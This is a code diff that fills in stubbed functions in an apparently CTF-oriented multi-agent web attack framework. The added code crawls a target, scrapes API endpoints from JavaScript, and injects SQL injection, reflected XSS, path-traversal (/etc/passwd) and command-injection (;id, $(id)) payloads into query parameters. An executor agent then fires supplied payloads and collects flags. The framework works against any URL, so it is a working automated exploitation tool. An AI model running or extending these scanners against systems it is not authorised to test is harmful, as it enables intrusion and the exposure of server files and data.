@@ -32,6 +32,8 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock, Event
 from urllib.parse import urljoin, urlparse
+import urllib.request
+import urllib.error
 import queue
 
 logger = logging.getLogger(__name__)
@@ -377,20 +379,24 @@ class ExplorerAgent(BaseAgent):
         pages = []
 
         try:
-            # 这里需要实际的HTTP请求实现
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                content = resp.read().decode("utf-8", errors="ignore")
+                status = resp.status
+                headers = dict(resp.headers)
             page_data = {
                 "url": url,
                 "method": "GET",
-                "status": 200,
-                "content": "",  # 实际内容
-                "headers": {}
+                "status": status,
+                "content": content[:5000],
+                "headers": headers
             }
             pages.append(page_data)
 
             # 检测Flag
             if self.context:
                 flag_detector = FlagDetector()
-                flags = flag_detector.detect(page_data.get("content", ""))
+                flags = flag_detector.detect(content)
                 if flags:
                     self.send_message(MessageType.FLAG, flags, priority=MessagePriority.CRITICAL)
                     self.context.flags.extend([f["flag"] for f in flags])
@@ -428,7 +434,22 @@ class ExplorerAgent(BaseAgent):
                     if any(bl in js_url.lower() for bl in ['bootstrap', 'jquery', 'vue', 'react']):
                         continue
 
-                    apis[js_url] = []  # TODO: 实际解析JS内容
+                    # 尝试获取JS内容并提取API端点
+                    try:
+                        req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0"})
+                        with urllib.request.urlopen(req, timeout=5) as resp:
+                            js_content = resp.read().decode("utf-8", errors="ignore")
+                        api_patterns = [
+                            r'["\'](\/[a-zA-Z0-9_\-\/]+(?:\?[^"\']*)?)["\']]',
+                            r'(?:fetch|axios|get|post)\(["\'](\/[^"\'\ )]+)',
+                            r'url:\s*["\'](\/[^"\'\ )]+)',
+                        ]
+                        found_apis = []
+                        for pat in api_patterns:
+                            found_apis.extend(re.findall(pat, js_content))
+                        apis[js_url] = list(set(found_apis))
+                    except Exception:
+                        apis[js_url] = []
 
         return apis
 
@@ -451,8 +472,23 @@ class ExplorerAgent(BaseAgent):
                 return None
 
             self.explored_urls.add(url)
-            # TODO: 实际HTTP请求
-            return None  # 返回页面数据或None
+            try:
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    content = resp.read().decode("utf-8", errors="ignore")
+                    return {
+                        "url": url,
+                        "method": "GET",
+                        "status": resp.status,
+                        "content": content[:3000],
+                        "headers": dict(resp.headers)
+                    }
+            except urllib.error.HTTPError as e:
+                if e.code < 404:
+                    return {"url": url, "method": "GET", "status": e.code, "content": "", "headers": {}}
+                return None
+            except Exception:
+                return None
 
         tasks = [check_path(p) for p in common_paths]
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -587,25 +623,90 @@ class ScannerAgent(BaseAgent):
 
         return vulns
 
+    def _http_get(self, url: str, timeout: int = 5) -> Optional[str]:
+        """发送 GET 请求，返回响应文本"""
+        try:
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=timeout) as resp:
+                return resp.read().decode("utf-8", errors="ignore")
+        except Exception:
+            return None
+
+    def _inject_param(self, url: str, payload: str) -> str:
+        """将 payload 附加到 URL 的第一个查询参数值"""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        parsed = urlparse(url)
+        if not parsed.query:
+            return url + ("?q=" + urllib.parse.quote(payload) if "?" not in url else "&q=" + urllib.parse.quote(payload))
+        parts = parsed.query.split("&")
+        first_key = parts[0].split("=")[0]
+        new_query = first_key + "=" + urllib.parse.quote(payload) + ("&" + "&".join(parts[1:]) if len(parts) > 1 else "")
+        return urlunparse(parsed._replace(query=new_query))
+
     async def _detect_sqli(self, page: Dict) -> List[Dict]:
-        """检测SQL注入"""
-        # TODO: 实现SQL注入检测逻辑
-        return []
+        """检测SQL注入 - 基于报错特征"""
+        vulns = []
+        url = page.get("url", "")
+        if not url or "?" not in url:
+            return vulns
+        sqli_payloads = ["'", "'--", "' OR '1'='1", "\""]
+        error_patterns = [
+            r"sql syntax", r"mysql_fetch", r"ORA-\d+", r"SQLite",
+            r"syntax error", r"Warning.*mysql", r"unclosed quotation",
+            r"pg_query", r"SQLSTATE"
+        ]
+        for payload in sqli_payloads:
+            test_url = self._inject_param(url, payload)
+            body = self._http_get(test_url)
+            if body:
+                for pat in error_patterns:
+                    if re.search(pat, body, re.IGNORECASE):
+                        vulns.append({"type": "sqli", "url": url, "payload": payload, "evidence": pat})
+                        return vulns  # 找到即返回
+        return vulns
 
     async def _detect_xss(self, page: Dict) -> List[Dict]:
-        """检测XSS"""
-        # TODO: 实现XSS检测逻辑
-        return []
+        """检测XSS - 基于反射特征"""
+        vulns = []
+        url = page.get("url", "")
+        if not url or "?" not in url:
+            return vulns
+        marker = "<script>alert(1)</script>"
+        test_url = self._inject_param(url, marker)
+        body = self._http_get(test_url)
+        if body and marker in body:
+            vulns.append({"type": "xss", "url": url, "payload": marker, "evidence": "reflected"})
+        return vulns
 
     async def _detect_lfi(self, page: Dict) -> List[Dict]:
-        """检测LFI"""
-        # TODO: 实现LFI检测逻辑
-        return []
+        """检测LFI - 尝试读取 /etc/passwd"""
+        vulns = []
+        url = page.get("url", "")
+        if not url or "?" not in url:
+            return vulns
+        lfi_payloads = ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd"]
+        for payload in lfi_payloads:
+            test_url = self._inject_param(url, payload)
+            body = self._http_get(test_url)
+            if body and re.search(r"root:.*:0:0:", body):
+                vulns.append({"type": "lfi", "url": url, "payload": payload, "evidence": "passwd_found"})
+                return vulns
+        return vulns
 
     async def _detect_cmdi(self, page: Dict) -> List[Dict]:
-        """检测命令注入"""
-        # TODO: 实现命令注入检测逻辑
-        return []
+        """检测命令注入 - 基于时间延迟或输出特征"""
+        vulns = []
+        url = page.get("url", "")
+        if not url or "?" not in url:
+            return vulns
+        cmdi_payloads = [";id", "|id", "`id`", "$(id)"]
+        for payload in cmdi_payloads:
+            test_url = self._inject_param(url, payload)
+            body = self._http_get(test_url)
+            if body and re.search(r"uid=\d+", body):
+                vulns.append({"type": "cmdi", "url": url, "payload": payload, "evidence": "uid_found"})
+                return vulns
+        return vulns
 
 
 # ==================== Solutioner Agent ====================
@@ -764,10 +865,31 @@ class ExecutorAgent(BaseAgent):
             "flag": None
         }
 
-        # 执行payload
+        # 执行payload，发送实际HTTP请求
         for payload in payloads:
-            # TODO: 实际执行HTTP请求
             logger.debug(f"执行Payload: {payload}")
+            try:
+                test_url = url
+                if "?" in url:
+                    from urllib.parse import urlparse, urlunparse
+                    parsed = urlparse(url)
+                    parts = parsed.query.split("&")
+                    first_key = parts[0].split("=")[0] if parts[0] else "q"
+                    new_query = first_key + "=" + urllib.parse.quote(str(payload)) + ("&" + "&".join(parts[1:]) if len(parts) > 1 else "")
+                    test_url = urlunparse(parsed._replace(query=new_query))
+                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=8) as resp:
+                    body = resp.read().decode("utf-8", errors="ignore")
+                result["response"] = body[:2000]
+                # 检测Flag
+                flag_detector = FlagDetector()
+                flags = flag_detector.detect(body)
+                if flags:
+                    result["success"] = True
+                    result["flag"] = flags[0]["flag"]
+                    break
+            except Exception as e:
+                logger.debug(f"Payload执行异常: {e}")
 
         return result
 
